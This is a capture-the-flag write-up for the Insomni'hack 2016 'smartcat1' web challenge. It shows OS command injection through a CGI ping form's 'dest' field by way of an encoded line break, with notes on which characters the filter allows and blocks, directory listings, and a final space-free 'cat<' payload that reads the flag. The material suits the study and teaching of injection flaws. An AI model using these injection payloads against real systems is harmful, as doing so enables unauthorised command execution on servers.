@@ -1,0 +1,195 @@
+Damn it, that stupid smart cat litter is broken again
+Now only the debug interface is available here (http://smartcat.insomnihack.ch/cgi-bin/index.cgi) and this stupid thing only permits one ping to be sent!
+
+I know my contract number is stored somewhere on that interface but I can't find it and this is the only available page! Please have a look and get this info for me !
+
+FYI No need to bruteforce anything there. If you do you'll be banned permanently
+
+
+HTTP request
+
+POST /cgi-bin/index.cgi HTTP/1.1
+Host: smartcat.insomnihack.ch
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:43.0) Gecko/20100101 Firefox/43.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: pl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: http://smartcat.insomnihack.ch/cgi-bin/index.cgi
+Connection: close
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 14
+
+dest=localhost
+
+
+HTTP response
+
+HTTP/1.1 200 OK
+Date: Sat, 16 Jan 2016 09:48:28 GMT
+Server: Apache/2.4.7 (Ubuntu)
+X-Powered-By: solve_me_already	
+Vary: Accept-Encoding
+Content-Length: 586
+Connection: close
+Content-Type: text/html
+
+
+Work
+--------
+
+POST /cgi-bin/index.cgi HTTP/1.1
+Host: smartcat.insomnihack.ch
+Content-Length: 22
+
+dest=127.0.0.10%0d
+ls
+
+Response:
+
+(...)
+
+ <p>Ping results:</p><br/>
+  <pre>PING 127.0.0.10
+
+ (127.0.0.10) 56(84) bytes of data.
+64 bytes from 127.0.0.10: icmp_seq=1 ttl=64 time=0.015 ms
+
+--- 127.0.0.10
+
+ ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.015/0.015/0.015/0.000 ms
+index.cgi
+there
+</pre>
+
+(...)
+
+Can use:
+!
+@
+#
+%
+^
+&
+*
+)
+-
+_
+=
+~
+,
+.
+?
+/
+:
+; - end execution ?
+'
+"
+\
+enter
+
+Can't use:
+
+$
+|
+{}
+space
+tab
+`
+
+du command shows folder structure:
+
+(...)
+
+  <p>Ping results:</p><br/>
+  <pre>PING 127.0.0.1
+ (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.016 ms
+
+--- 127.0.0.1
+ ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.016/0.016/0.016/0.000 ms
+8	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the
+12	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is
+16	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here
+20	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though
+24	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously
+28	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me
+32	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell
+36	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please
+40	./there/is/your/flag/or/maybe/not/what/do/you/think/really
+44	./there/is/your/flag/or/maybe/not/what/do/you/think
+48	./there/is/your/flag/or/maybe/not/what/do/you
+52	./there/is/your/flag/or/maybe/not/what/do
+56	./there/is/your/flag/or/maybe/not/what
+60	./there/is/your/flag/or/maybe/not
+64	./there/is/your/flag/or/maybe
+68	./there/is/your/flag/or
+72	./there/is/your/flag
+76	./there/is/your
+80	./there/is
+84	./there
+92	.
+</pre>
+
+(...)
+
+find shows that ind the last directory is file called flag:
+
+(...)
+
+  <p>Ping results:</p><br/>
+  <pre>PING 127.0.0.1
+ (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.014 ms
+
+--- 127.0.0.1
+ ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.014/0.014/0.014/0.000 ms
+.
+./index.cgi
+./there
+./there/is
+./there/is/your
+./there/is/your/flag
+./there/is/your/flag/or
+./there/is/your/flag/or/maybe
+./there/is/your/flag/or/maybe/not
+./there/is/your/flag/or/maybe/not/what
+./there/is/your/flag/or/maybe/not/what/do
+./there/is/your/flag/or/maybe/not/what/do/you
+./there/is/your/flag/or/maybe/not/what/do/you/think
+./there/is/your/flag/or/maybe/not/what/do/you/think/really
+./there/is/your/flag/or/maybe/not/what/do/you/think/really/please
+./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell
+./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me
+./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously
+./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though
+./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here
+./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is
+./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the
+./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag
+</pre>
+
+(...)
+
+------------
+
+Solution:
+
+POST /cgi-bin/index.cgi HTTP/1.1
+Host: smartcat.insomnihack.ch
+Content-Length: 22
+
+dest=127.0.0.10%0d
+cat<./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag
+
+https://ctf.rip/insomnihack-teaser-2016-smartcat1-50-pt-web-challenge/
+https://b01lers.net/challenges/Insomni'hack%202016/smartcat1/82/
+
